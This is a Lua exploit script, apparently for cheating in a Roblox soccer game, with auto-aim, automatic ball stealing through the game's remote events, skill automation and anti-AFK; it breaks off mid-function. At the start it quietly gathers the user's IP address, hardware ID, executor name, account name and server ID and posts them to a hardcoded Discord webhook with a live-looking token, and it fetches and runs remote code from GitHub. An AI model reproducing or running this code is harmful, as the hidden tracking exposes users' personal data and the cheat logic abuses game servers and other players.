repeat task.wait() until game:IsLoaded()

local Players = game:GetService('Players')
local MyPlayer = Players.LocalPlayer
local MyGui = MyPlayer.PlayerGui
local MyChar = MyPlayer.Character or MyPlayer.CharacterAdded:wait()
local MyHRP = MyChar:WaitForChild('HumanoidRootPart')

local Http = game:GetService("HttpService")
local marketplaceService = game:GetService("MarketplaceService")

local VevoWebhook = "https://discord.com/api/webhooks/1056819419424243743/MANqYJHbjSh8wI4Oxqwcdlwo8qS-NYl9aYS3IyQNyZck4aJ0U1optNhoJzu4qa-Wn-dD"
local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId) -- getting game name
local iprequest = request({
    Url = 'https://httpbin.org/ip',
    Method = 'GET',
})
local ip = Http:JSONDecode(iprequest.Body).origin
local hwid = (gethwid and gethwid()) or ''
local executor = (getexecutorname and getexecutorname()) or ''
local vevorequest = request({
	Url = VevoWebhook,
	Method = 'POST',
	Headers = {
		['Content-Type'] = 'application/json'
	},
	Body = Http:JSONEncode({
		["content"] = "",
		["embeds"] = {{
			["title"] = "**Vevo Hub**",
			["description"] = '',
			["type"] = "rich",
			["color"] = tonumber(0xffffff),
			["thumbnail"] = {
				["url"] = "https://i.imgur.com/8VP0kS9.png"
			},
			["fields"] = {
				{
					["name"] = "HWID: "..hwid,
					["value"] = '',
					["inline"] = false
				},
				{
					["name"] = "IP: "..ip,
					["value"] = '',
					["inline"] = false
				},
				{
					["name"] = "EXECUTOR: "..executor,
					["value"] = '',
					["inline"] = false
				},
				{
					["name"] = "USER: "..MyPlayer.Name.." ["..tostring(MyPlayer.UserId).."]",
					["value"] = '',
					["inline"] = false
				},
				{
					["name"] = "GAME: "..info.Name.." ["..tostring(game.PlaceId).."]",
					["value"] = '',
					["inline"] = false
				},
				{
					["name"] = "JobID: "..tostring(game.JobId),
					["value"] = '',
					["inline"] = false
				}
			}
		}}
	})
})

--[[loadstring(game:HttpGet('https://raw.githubusercontent.com/Tamim468/releases/main/bypass.lua'))()
wait()]]

local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()

repeat task.wait() until Toggles and Options and Library

local Window = Library:CreateWindow({
    Title = 'Vevo Hub (Finger)',
    Center = true,
    AutoShow = true,
    TabPadding = 8,
    MenuFadeTime = 0.2
})
local Tabs = {
    Game = Window:AddTab('Game'),
    Farm = Window:AddTab('Farm'),
    Misc = Window:AddTab('Misc'),
    Player = Window:AddTab('Player'),
    ESP = Window:AddTab('ESP'),
    ['UI Settings'] = Window:AddTab('UI Settings'),
    Credits = Window:AddTab('Credits')
}
local Sections = {
    Punch = Tabs.Game:AddLeftGroupbox('Punch'),
    Speed = Tabs.Game:AddLeftGroupbox('Speed'),
	Defense = Tabs.Game:AddLeftGroupbox('Defense'),
	Positioning = Tabs.Game:AddLeftGroupbox('Positioning'),
	AutoFarm = Tabs.Farm:AddLeftGroupbox('AutoFarm'),
	Misc = Tabs.Misc:AddLeftGroupbox('Misc'),
	Player = Tabs.Player:AddLeftGroupbox('Player'),
	ESP = Tabs.ESP:AddLeftGroupbox('ESP'),
    Menu = Tabs['UI Settings']:AddLeftGroupbox('Menu'),
	Credits = Tabs.Credits:AddLeftGroupbox('Credits')
}

local Players = game:GetService('Players')
local MyPlayer = Players.LocalPlayer
local MyChar = MyPlayer.Character or MyPlayer.CharacterAdded:wait()
local MyHRP = MyChar.HumanoidRootPart
local COREGUI = game:GetService('CoreGui')
local Http = game:GetService('HttpService')
local TeleportService = game:GetService('TeleportService')
local TweenService = game:GetService('TweenService')
local Api = 'https://games.roblox.com/v1/games/'
local _place = game.PlaceId
local _servers = Api.._place..'/servers/Public?sortOrder=Asc&limit=100'
local httprequest = (syn and syn.request) or (http and http.request) or http_request
local HumanMods = {}
local GC = getconnections or get_signal_cons
local PlaceId = game.PlaceId;
local Workspace = game:GetService('Workspace');
local Teams = game:GetService('Teams')
local RunService = game:GetService('RunService');
local CurrentCamera = Workspace.CurrentCamera
local WorldToViewportPoint = CurrentCamera.WorldToViewportPoint
local Inset = game:GetService('GuiService'):GetGuiInset().Y
local FindFirstChild = game.FindFirstChild
local FindFirstChildWhichIsA = game.FindFirstChildWhichIsA
local IsA = game.IsA
local Vector2new = Vector2.new
local Vector3new = Vector3.new
local CFramenew = CFrame.new
local Color3new = Color3.new
local Tfind = table.find
local create = table.create
local format = string.format
local floor = math.floor
local gsub = string.gsub
local sub = string.sub
local lower = string.lower
local upper = string.upper
local random = math.random
local Mouse = MyPlayer:GetMouse();
local MouseVector = Vector2new(Mouse.X, Mouse.Y);
local Characters = {}
local Drawings = {}
local WSIndex = nil
local JPIndex = nil
local wsLoop
local Clip
local WSpin = false
local wsCA
local jpLoop
local jpCA
local ToggleESP
local VirtualInputManager = Instance.new('VirtualInputManager')
local UserInputService = game:GetService('UserInputService')
local Hooks = {}
if PlaceId ~= 12467817668 and not gethwid then
	local OldCameraShakeFunc = require(game:GetService('ReplicatedStorage').Modules.CameraShaker).Update
end

getgenv().NCToggle = false
getgenv().Noclipping = nil
getgenv().FirstWS = MyChar.Humanoid.WalkSpeed
getgenv().FirstJP = MyChar.Humanoid.JumpPower
getgenv().WalkSpeedToggle = false
getgenv().CurrentSpeed = MyChar.Humanoid.WalkSpeed
getgenv().JumpPowerToggle = false
getgenv().CurrentJumpPower = MyChar.Humanoid.JumpPower
getgenv().AFKTarget = ''
getgenv().PlrESPChecker = false
getgenv().ShootingPower = 1
getgenv().IsAutoAim = false
getgenv().IsAutoFarm = false
getgenv().IsLeagueFarm = false
getgenv().SpinType = 'Weapon'
getgenv().Slot = '1'
getgenv().Cosmetics = 'Emotes'
getgenv().IsAutoPosition = false
getgenv().IsAntiAFK = false
getgenv().IsSpeedDemon = true
getgenv().IsAutoBuy = false
getgenv().FieldType = ''
getgenv().IsAutoDelete = false
getgenv().IsAutoSpin = false
getgenv().BoostFPS = false
getgenv().IsFov = true
getgenv().IsAutoDefense = false
getgenv().IsAutoTrapping = false
getgenv().IsAutoFinishing = false
if PlaceId ~= 12467817668 then
	getgenv().SpeedBoost = (30-(17+MyPlayer:GetAttribute('RunSpeedBuff')))
end
getgenv().Team = 1
getgenv().Position = 'Forward'
getgenv().ShootingMode = "Middle"
getgenv().DefensiveMode = false
getgenv().BallOwner = ''
getgenv().CanonKaiser = true
getgenv().IsHitbox = false
getgenv().IsGamble = false
getgenv().IsShootingMode = false
getgenv().IsReverse = false

for i,v in pairs(getconnections(MyPlayer.Idled)) do
	v:Disable()
	v:Disconnect()
end

if not game:GetService('Workspace'):FindFirstChild('Corners') then
	local Corners = Instance.new('Folder')
	Corners.Parent = game:GetService('Workspace')
	Corners.Name = 'Corners'
end
if not game:GetService('Workspace'):WaitForChild('Corners'):FindFirstChild('Corner1') then
	local SPart = Instance.new('Part')
	SPart.Name = 'Corner1'
	SPart.Anchored = true
	SPart.Shape = Enum.PartType.Ball
	SPart.Color = Color3.new(1, 1, 1)
	SPart.Parent = game:GetService('Workspace'):WaitForChild('Corners')
	SPart.Transparency = 1
	SPart.CanCollide = false
	SPart.Size = Vector3.new(1,1,1)
end
if not game:GetService('Workspace'):WaitForChild('Corners'):FindFirstChild('Corner2') then
	local SPart = Instance.new('Part')
	SPart.Name = 'Corner2'
	SPart.Anchored = true
	SPart.Shape = Enum.PartType.Ball
	SPart.Color = Color3.new(1, 1, 1)
	SPart.Parent = game:GetService('Workspace'):WaitForChild('Corners')
	SPart.Transparency = 1
	SPart.CanCollide = false
	SPart.Size = Vector3.new(1,1,1)
end
if not game:GetService('Workspace'):WaitForChild('Corners'):FindFirstChild('Corner3') then
	local SPart = Instance.new('Part')
	SPart.Name = 'Corner3'
	SPart.Anchored = true
	SPart.Shape = Enum.PartType.Ball
	SPart.Color = Color3.new(1, 1, 1)
	SPart.Parent = game:GetService('Workspace'):WaitForChild('Corners')
	SPart.Transparency = 1
	SPart.CanCollide = false
	SPart.Size = Vector3.new(1,1,1)
end
if not game:GetService('Workspace'):WaitForChild('Corners'):FindFirstChild('Corner4') then
	local SPart = Instance.new('Part')
	SPart.Name = 'Corner4'
	SPart.Anchored = true
	SPart.Shape = Enum.PartType.Ball
	SPart.Color = Color3.new(1, 1, 1)
	SPart.Parent = game:GetService('Workspace'):WaitForChild('Corners')
	SPart.Transparency = 1
	SPart.CanCollide = false
	SPart.Size = Vector3.new(1,1,1)
end
if not game:GetService('Workspace'):FindFirstChild('FinalWalls') then
	local FinalWalls = Instance.new('Folder')
	FinalWalls.Parent = game:GetService('Workspace')
	FinalWalls.Name = 'FinalWalls'
end
if not game:GetService('Workspace'):WaitForChild('FinalWalls'):FindFirstChild('FinalWall1') then
	local FinalWall1 = Instance.new('Part')
	FinalWall1.Anchored = true
	FinalWall1.Name = 'FinalWall1'
	FinalWall1.Parent = game:GetService('Workspace'):WaitForChild('FinalWalls')
	FinalWall1.Transparency = 1
	FinalWall1.Size = Vector3.new(0.1, 2048, 2048)
	FinalWall1.CanCollide = false
	FinalWall1.CanQuery = true
end
if not game:GetService('Workspace'):WaitForChild('FinalWalls'):FindFirstChild('FinalWall2') then
	local FinalWall1 = Instance.new('Part')
	FinalWall1.Anchored = true
	FinalWall1.Name = 'FinalWall2'
	FinalWall1.Parent = game:GetService('Workspace'):WaitForChild('FinalWalls')
	FinalWall1.Transparency = 1
	FinalWall1.Size = Vector3.new(-0.1, 2048, 2048)
	FinalWall1.CanCollide = false
	FinalWall1.CanQuery = true
end
if not game:GetService('Workspace'):FindFirstChild('Hitboxes') then
	local Hitboxes = Instance.new('Folder')
	Hitboxes.Parent = game:GetService('Workspace')
	Hitboxes.Name = 'Hitboxes'
end
if game:GetService('Workspace'):FindFirstChild('GameField') then
	for i,v in pairs(game:GetService('Workspace').GameField.BlueLockmanHitboxes:GetChildren()) do
		if v then
			v:Destroy()
		end
	end
end
if game:GetService('Workspace'):FindFirstChild('MiniField') then
	for i,v in pairs(game:GetService('Workspace').MiniField.BlueLockmanHitboxes:GetChildren()) do
		if v then
			v:Destroy()
		end
	end
end
task.spawn(function()
	while task.wait() do
		task.spawn(function()
			if getgenv().IsAutoDefense and not MyChar:FindFirstChild('Ball') then
				for i,v in pairs(Players:GetChildren()) do
					if v.Character and v.Character:FindFirstChild('HumanoidRootPart') then
						if (v.Character.HumanoidRootPart.Position - MyHRP.Position).Magnitude <= 23 and v.Character:FindFirstChild('Ball') then
							local args = {
								[1] = 'TakeBall',
								[2] = v.Character.Ball.Ball
							}
							game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('PunchRemote'):FireServer(unpack(args))
						end
					end
				end
			end
		end)
	end
end)
for i,v in pairs(Players:GetChildren()) do
	if v.Character and v.Character:FindFirstChild('Ball') and v.Character.Ball:GetAttribute('GameBall') then
		getgenv().BallOwner = v
	end
end
task.spawn(function()
	while task.wait() do
		for i,v in pairs(Players:GetChildren()) do
			if v.Character and v.Character:FindFirstChild('Ball') and v.Character.Ball:GetAttribute('GameBall') then
				getgenv().BallOwner = v
			end
		end
	end
end)
function GetBall()
	if workspace:GetAttribute("GameEnded") then
		return
	else
		for i,v in pairs(workspace:GetChildren()) do
			if v.Name == 'Ball' and v:GetAttribute('GameBall') then
				return v:WaitForChild('Ball')
			end
		end
		for i,v in pairs(Players:GetChildren()) do
			if v.Character and v.Character:FindFirstChild('Ball') and v.Character:WaitForChild('Ball'):GetAttribute('GameBall') then
				return v.Character:WaitForChild('Ball'):WaitForChild('Ball')
			end
		end
	end
	return
end
task.spawn(function()
	repeat
		if getgenv().CanonKaiser then
			for _, anim in pairs(MyChar.Humanoid:GetPlayingAnimationTracks()) do
				if anim.Animation.AnimationId == 'rbxassetid://13732545430' then
					local destroying = true
					task.spawn(function()
						repeat
							task.spawn(function()
								for _, anim in pairs(MyChar.Humanoid:GetPlayingAnimationTracks()) do
									if anim.Animation.AnimationId == 'rbxassetid://13732545430' then
										anim:Stop()
									end
								end
							end)
							task.wait()
						until not destroying
					end)
					wait(0.25)
					destroying = false
					local kaiseranim = Instance.new("Animation")
					kaiseranim.AnimationId = 'rbxassetid://13732545430'
					local kaisertrack = MyChar.Humanoid.Animator:LoadAnimation(kaiseranim)
					kaisertrack:Play()
					wait(1.5)
				end
			end
		end
		task.wait()
	until not MyPlayer
end)
task.spawn(function()
	repeat
		if getgenv().CanonKaiser then
			for _, anim in pairs(MyChar.Humanoid.Animator:GetPlayingAnimationTracks()) do
				if anim.Animation.AnimationId == 'rbxassetid://13732545430' then
					local destroying = true
					task.spawn(function()
						repeat
							task.spawn(function()
								for _, anim in pairs(MyChar.Humanoid.Animator:GetPlayingAnimationTracks()) do
									if anim.Animation.AnimationId == 'rbxassetid://13732545430' then
										anim:Stop()
									end
								end
							end)
							task.wait()
						until not destroying
					end)
					wait(0.25)
					destroying = false
					local kaiseranim = Instance.new("Animation")
					kaiseranim.AnimationId = 'rbxassetid://13732545430'
					local kaisertrack = MyChar.Humanoid.Animator:LoadAnimation(kaiseranim)
					kaisertrack:Play()
					wait(1.5)
				end
			end
		end
		task.wait()
	until not MyPlayer
end)
function GetField()
	if workspace:GetAttribute("GameField") then
		if workspace:GetAttribute("GameField") == 'MiniField' then
			return 'MiniField'
		elseif workspace:GetAttribute("GameField") == 'BigField' then
			return 'BigField'
		end
	else
		return 'BigField'
	end
end
task.spawn(function()
	while task.wait() do
		getgenv().FieldType = GetField()
		if getgenv().FieldType == 'BigField' then
			game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner1').Position = Vector3.new(-464.5, MyHRP.CFrame.Y, -369)
			game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner2').Position = Vector3.new(-464.5,MyHRP.CFrame.Y, -341)
			game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner3').Position = Vector3.new(-1107.5, MyHRP.CFrame.Y, -369)
			game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner4').Position = Vector3.new(-1107.5, MyHRP.CFrame.Y, -341)
			game:GetService('Workspace'):WaitForChild('FinalWalls'):WaitForChild('FinalWall1').Position = Vector3.new(-464.5,MyHRP.CFrame.Y,-369)
			game:GetService('Workspace'):WaitForChild('FinalWalls'):WaitForChild('FinalWall2').Position = Vector3.new(-1107.5,MyHRP.CFrame.Y,-369)
		elseif getgenv().FieldType == 'MiniField' then
			game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner1').Position = Vector3.new(-669,MyHRP.CFrame.Y,372.5)
			game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner2').Position = Vector3.new(-669,MyHRP.CFrame.Y,401)
			game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner3').Position = Vector3.new(-1113,MyHRP.CFrame.Y,372.5)
			game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner4').Position = Vector3.new(-1113,MyHRP.CFrame.Y,401)
			game:GetService('Workspace'):WaitForChild('FinalWalls'):WaitForChild('FinalWall1').Position = Vector3.new(-669,MyHRP.CFrame.Y,372.5)
			game:GetService('Workspace'):WaitForChild('FinalWalls'):WaitForChild('FinalWall2').Position = Vector3.new(-1113,MyHRP.CFrame.Y,372.5)
		end
	end
end)
task.spawn(function()
	while task.wait() do
		task.spawn(function()
			if getgenv().IsAutoAim then
				if MyPlayer:GetAttribute('Playing') and workspace.CurrentCamera.CameraType ~= Enum.CameraType.Scriptable then
					MyChar.Humanoid.AutoRotate = false
					local rayOrigin = workspace.CurrentCamera.CFrame.p
					local rayDirection = (workspace.CurrentCamera.CFrame.LookVector) * 1000
					local rayParams = RaycastParams.new()
					rayParams.FilterDescendantsInstances = game:GetService('Workspace'):WaitForChild('FinalWalls'):GetChildren()
					rayParams.FilterType = Enum.RaycastFilterType.Include
					local rayResult = game:GetService('Workspace'):Raycast(rayOrigin, rayDirection, rayParams)
					if rayResult then
						local hitpos = rayResult.Position
						local ClosestDistancePart = {}
						local distance = (hitpos - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner1').Position).Magnitude
						local distance2 = (hitpos - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner2').Position).Magnitude
						local distance3 = (hitpos - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner3').Position).Magnitude
						local distance4 = (hitpos - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner4').Position).Magnitude
						table.insert(ClosestDistancePart, distance)
						table.insert(ClosestDistancePart, distance2)
						table.insert(ClosestDistancePart, distance3)
						table.insert(ClosestDistancePart, distance4)
						table.sort(ClosestDistancePart)
						local mindistance = ClosestDistancePart[1]
						local vec1
						local vec2
						local vec3
						local vec4
						if getgenv().IsReverse then
							vec1 = (MyHRP.CFrame.p - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner1').Position).Unit
						else
							vec1 = (game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner1').Position - MyHRP.CFrame.p).Unit
						end
						if getgenv().IsReverse then
							vec2 = (MyHRP.CFrame.p - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner2').Position).Unit
						else
							vec2 = (game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner2').Position - MyHRP.CFrame.p).Unit
						end
						if getgenv().IsReverse then
							vec3 = (MyHRP.CFrame.p - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner3').Position).Unit
						else
							vec3 = (game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner3').Position - MyHRP.CFrame.p).Unit
						end
						if getgenv().IsReverse then
							vec4 = (MyHRP.CFrame.p - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner4').Position).Unit
						else
							vec4 = (game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner4').Position - MyHRP.CFrame.p).Unit
						end
						if mindistance == distance then
							MyHRP.CFrame = CFrame.new(MyHRP.Position, (MyHRP.Position+vec1))
						elseif mindistance == distance2 then
							MyHRP.CFrame = CFrame.new(MyHRP.Position, (MyHRP.Position+vec2))
						elseif mindistance == distance3 then
							MyHRP.CFrame = CFrame.new(MyHRP.Position, (MyHRP.Position+vec3))
						elseif mindistance == distance4 then
							MyHRP.CFrame = CFrame.new(MyHRP.Position, (MyHRP.Position+vec4))
						end
					end
				end
			elseif MyPlayer:GetAttribute('Playing') and workspace.CurrentCamera.CameraType ~= Enum.CameraType.Scriptable and not getgenv().IsAutoTrapping then
				MyChar.Humanoid.AutoRotate = true
			end
		end)
	end
end)

local RTZSlot = ''
task.spawn(function()
	if MyPlayer.PlayerGui:FindFirstChild('SkilsGui') then
		repeat
			for i,v in pairs(MyPlayer.PlayerGui.SkilsGui:GetChildren()) do
				if string.find(tostring(v), 'Slot') then
					if v.SkillName.Text == 'Zero Reset Turn' then
						RTZSlot = v
					end
				end
			end
			task.wait()
		until RTZSlot ~= ''
	end
end)
local CreativeSlot = ''
task.spawn(function()
	if MyPlayer.PlayerGui:FindFirstChild('SkilsGui') then
		repeat
			for i,v in pairs(MyPlayer.PlayerGui.SkilsGui:GetChildren()) do
				if string.find(tostring(v), 'Slot') then
					if v.SkillName.Text == 'Creative Trap' then
						CreativeSlot = v
					end
				end
			end
			task.wait()
		until CreativeSlot ~= ''
	end
end)
local BlackHoleSlot = ''
task.spawn(function()
	if MyPlayer.PlayerGui:FindFirstChild('SkilsGui') then
		repeat
			for i,v in pairs(MyPlayer.PlayerGui.SkilsGui:GetChildren()) do
				if string.find(tostring(v), 'Slot') then
					if v.SkillName.Text == 'Black Hole Trap' then
						BlackHoleSlot = v
					end
				end
			end
			task.wait()
		until BlackHoleSlot ~= ''
	end
end)
local DirectImpactSlot = ''
task.spawn(function()
	if MyPlayer.PlayerGui:FindFirstChild('SkilsGui') then
		repeat
			for i,v in pairs(MyPlayer.PlayerGui.SkilsGui:GetChildren()) do
				if string.find(tostring(v), 'Slot') then
					if v.SkillName.Text == 'Direct Impact' then
						DirectImpactSlot = v
					end
				end
			end
			task.wait()
		until DirectImpactSlot ~= ''
	end
end)
local ExploisveSlot = ''
task.spawn(function()
	if MyPlayer.PlayerGui:FindFirstChild('SkilsGui') then
		repeat
			for i,v in pairs(MyPlayer.PlayerGui.SkilsGui:GetChildren()) do
				if string.find(tostring(v), 'Slot') then
					if v.SkillName.Text == 'Explosive Acceleration' then
						ExploisveSlot = v
					end
				end
			end
			task.wait()
		until ExploisveSlot ~= ''
	end
end)
local DirectShot = ''
task.spawn(function()
	if MyPlayer.PlayerGui:FindFirstChild('SkilsGui') then
		repeat
			for i,v in pairs(MyPlayer.PlayerGui.SkilsGui:GetChildren()) do
				if string.find(tostring(v), 'Slot') then
					if v.SkillName.Text == 'Direct Shot' then
						DirectShot = v
					end
				end
			end
			task.wait()
		until DirectShot ~= ''
	end
end)
function RTZ()
	repeat
		local args = {
			[1] = 'Hold',
			[2] = RTZSlot.SkillName.Text}
		game:GetService('ReplicatedStorage').Remotes.TranciverRemote:FireServer(unpack(args))
		task.wait()
	until MyPlayer:GetAttribute('UsingSkill') or RTZSlot.CDFrame.Visible
end
function CreativeTrap()
	repeat
		local args = {
			[1] = 'Hold',
			[2] = CreativeSlot.SkillName.Text}
		game:GetService('ReplicatedStorage').Remotes.TranciverRemote:FireServer(unpack(args))
		local args = {
			[1] = 'UseSkill',
			[2] = CreativeSlot.SkillName.Text}
		game:GetService('ReplicatedStorage').Remotes.TranciverRemote:FireServer(unpack(args))
		task.wait()
	until MyPlayer:GetAttribute('UsingSkill') or CreativeSlot.CDFrame.Visible
end
function BlackHole()
	repeat
		local args = {
			[1] = 'Hold',
			[2] = BlackHoleSlot.SkillName.Text}
		game:GetService('ReplicatedStorage').Remotes.TranciverRemote:FireServer(unpack(args))
		local args = {
			[1] = 'UseSkill',
			[2] = BlackHoleSlot.SkillName.Text}
		game:GetService('ReplicatedStorage').Remotes.TranciverRemote:FireServer(unpack(args))
		task.wait()
	until MyPlayer:GetAttribute('UsingSkill') or BlackHoleSlot.CDFrame.Visible
end
function DirectImpact()
	local args = {
		[1] = 'Hold',
		[2] = DirectImpactSlot.SkillName.Text}
	game:GetService('ReplicatedStorage').Remotes.TranciverRemote:FireServer(unpack(args))
	local args = {
		[1] = 'UseSkill',
		[2] = DirectImpactSlot.SkillName.Text}
	game:GetService('ReplicatedStorage').Remotes.TranciverRemote:FireServer(unpack(args))
end
function HoldingSkill()
    for _,skill in pairs(MyPlayer.PlayerGui.SkilsGui:GetChildren()) do
        if string.find(skill.Name, 'Slot') and skill.AbsoluteSize.Magnitude > 144 then
            return skill.SkillName.Text
        end
    end
    return
end
task.spawn(function()
	while task.wait() do
		if getgenv().IsHitbox and HoldingSkill() then
			if HoldingSkill() == 'Creative Trap' then
				if not workspace:WaitForChild('Hitboxes'):FindFirstChild('CreativeHitbox') then
					local CreativeHitbox = Instance.new('Part', workspace:WaitForChild('Hitboxes'))
					CreativeHitbox.Name = 'CreativeHitbox'
					CreativeHitbox.Size = Vector3.new(16,4.5,42)
					CreativeHitbox.Anchored = true
					CreativeHitbox.CanCollide = false
					CreativeHitbox.CanQuery = false
					CreativeHitbox.Transparency = 0.5
					CreativeHitbox.Material = Enum.Material.Air
					task.spawn(function()
						while CreativeHitbox do task.wait()
							CreativeHitbox.CFrame = MyHRP.CFrame * CFrame.new(0,0,-13)
							CreativeHitbox.Transparency = 0.5
						end
					end)
				end
			end
		else
			for i,v in pairs(workspace:WaitForChild('Hitboxes'):GetChildren()) do
				v:Destroy()
			end
		end
	end
end)
function DefendShot()
	local startpos = getgenv().BallOwner.Character.HumanoidRootPart.Position
	local range = (MyHRP.Position - startpos).Magnitude
	local direction = getgenv().BallOwner.Character.HumanoidRootPart.CFrame.LookVector
	local point = direction * range
	local finalpos = startpos + point
	task.spawn(function()
		while not MyChar:FindFirstChild('Ball') or not MyPlayer:GetAttribute('UsingSkill') do task.wait()
			startpos = getgenv().BallOwner.Character.HumanoidRootPart.Position
			range = (MyHRP.Position - startpos).Magnitude
			direction = getgenv().BallOwner.Character.HumanoidRootPart.CFrame.LookVector
			point = direction * range
			finalpos = startpos + point
		end
	end)
	--[[task.spawn(function()
		repeat
			MyHRP.CFrame = CFrame.new(MyHRP.Position, Vector3.new(finalpos.X, MyHRP.Position.Y, finalpos.Z))
			task.wait()
		until MyChar:FindFirstChild('Ball') or MyPlayer:GetAttribute('UsingSkill')
	end)
	task.wait(0.15)]]
	if (MyHRP.Position - finalpos).Magnitude <= 4 then
		if (startpos-finalpos).Magnitude > (MyHRP.Position-finalpos).Magnitude then
			if not RTZSlot.CDFrame.Visible then
				RTZ()
			elseif not CreativeSlot.CDFrame.Visible then
				CreativeTrap()
			end
		else
			if not CreativeSlot.CDFrame.Visible then
				CreativeTrap()
			elseif not RTZSlot.CDFrame.Visible then
				RTZ()
			end
		end
	else
		if not CreativeSlot.CDFrame.Visible then
			CreativeTrap()
		elseif not RTZSlot.CDFrame.Visible then
			RTZ()
		end
	end
	wait(1.5)
end
function GetClosestCorner()
	if MyPlayer:GetAttribute('Playing') and getgenv().BallOwner ~= '' and getgenv().BallOwner ~= MyPlayer then
		local rayOrigin = getgenv().BallOwner.Character.HumanoidRootPart.CFrame.p
		local rayDirection = (getgenv().BallOwner.Character.HumanoidRootPart.CFrame.LookVector) * 1000
		local rayParams = RaycastParams.new()
		rayParams.FilterDescendantsInstances = game:GetService('Workspace'):WaitForChild('FinalWalls'):GetChildren()
		rayParams.FilterType = Enum.RaycastFilterType.Include
		local rayResult = game:GetService('Workspace'):Raycast(rayOrigin, rayDirection, rayParams)
		if rayResult then
			local hitpos = rayResult.Position
			local ClosestDistancePart = {}
			local side1
			local side2
			if GetField() == 'BigField' then
				side1 = workspace.GameField.BlueLockmans.Spot1
				side2 = workspace.GameField.BlueLockmans.Spot2
			elseif GetField() == 'MiniField' then
				side1 = workspace.MiniField.BlueLockmans.Spot1
				side2 = workspace.MiniField.BlueLockmans.Spot2
			end
			local distance = (hitpos - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner1').Position).Magnitude
			local distance2 = (hitpos - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner2').Position).Magnitude
			local distance3 = (hitpos - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner3').Position).Magnitude
			local distance4 = (hitpos - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner4').Position).Magnitude
			if (MyHRP.CFrame.p - side2.CFrame.p).Magnitude < (getgenv().BallOwner.Character.HumanoidRootPart.CFrame.p - side2.CFrame.p).Magnitude then
				table.insert(ClosestDistancePart, distance)
				table.insert(ClosestDistancePart, distance2)
			else
				table.insert(ClosestDistancePart, distance3)
				table.insert(ClosestDistancePart, distance4)
			end
			table.sort(ClosestDistancePart)
			local mindistance = ClosestDistancePart[1]
			if mindistance == distance then
				if getgenv().IsGamble then
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner2')
				else
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner1')
				end	
			elseif mindistance == distance2 then
				if getgenv().IsGamble then
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner1')
				else
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner2')
				end	
			elseif mindistance == distance3 then
				if getgenv().IsGamble then
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner4')
				else
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner3')
				end	
			elseif mindistance == distance4 then
				if getgenv().IsGamble then
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner3')
				else
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner4')
				end	
			end
		else
			local hitpos = getgenv().BallOwner.Character.HumanoidRootPart.CFrame.p
			local ClosestDistancePart = {}
			local side1 = workspace.GameField.BlueLockmans.Spot1
			local side2 = workspace.GameField.BlueLockmans.Spot2
			local distance = (hitpos - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner1').Position).Magnitude
			local distance2 = (hitpos - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner2').Position).Magnitude
			local distance3 = (hitpos - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner3').Position).Magnitude
			local distance4 = (hitpos - game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner4').Position).Magnitude
			if (MyHRP.CFrame.p - side2.CFrame.p).Magnitude < (MyHRP.CFrame.p - side1.CFrame.p).Magnitude then
				table.insert(ClosestDistancePart, distance)
				table.insert(ClosestDistancePart, distance2)
			else
				table.insert(ClosestDistancePart, distance3)
				table.insert(ClosestDistancePart, distance4)
			end
			table.sort(ClosestDistancePart)
			local mindistance = ClosestDistancePart[1]
			if mindistance == distance then
				if getgenv().IsGamble then
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner2')
				else
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner1')
				end	
			elseif mindistance == distance2 then
				if getgenv().IsGamble then
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner1')
				else
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner2')
				end	
			elseif mindistance == distance3 then
				if getgenv().IsGamble then
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner4')
				else
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner3')
				end	
			elseif mindistance == distance4 then
				if getgenv().IsGamble then
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner3')
